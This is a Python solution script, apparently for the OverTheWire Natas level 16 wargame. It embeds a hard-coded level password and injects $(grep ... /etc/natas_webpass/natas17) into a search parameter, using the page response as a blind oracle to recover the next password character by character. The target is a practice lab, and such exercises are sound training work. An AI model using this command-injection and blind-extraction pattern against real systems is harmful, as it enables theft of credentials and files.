import natasX

natas = natasX

#print(natas.natasX(16, "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh", endpoint="/?needle=natas$(grep a /etc/natas_webpass/natas17)").text)
w = ""

'''
for n in range(26):
    if not natas.natasX(
            16,
            "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh",
            endpoint=f'/?needle=natas$(grep {chr(65+n)} /etc/natas_webpass/natas17)'
    ).text.__contains__("sonatas"):
        w += chr(65+n)

    if not natas.natasX(
            16,
            "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh",
            endpoint=f'/?needle=natas$(grep {chr(97+n)} /etc/natas_webpass/natas17)'
    ).text.__contains__("sonatas"):
        w += chr(97+n)

for n in range(10):
    if not natas.natasX(
            16,
            "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh",
            endpoint=f'/?needle=natas$(grep {chr(48+n)} /etc/natas_webpass/natas17)'
    ).text.__contains__("sonatas"):
        w += chr(48+n)

'''

w = "AbcdGgHhkmNnPQqrSsWw035789"
x = ""

for n in range(50):
    for i in w:
        if not natas.natasX(
                16,
                "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh",
                endpoint=f'/?needle=natas$(grep ^{x}{i} /etc/natas_webpass/natas17)'
        ).text.__contains__("sonatas"):
            x += i
            print(x)

        if len(x) < n:
            break

print(x)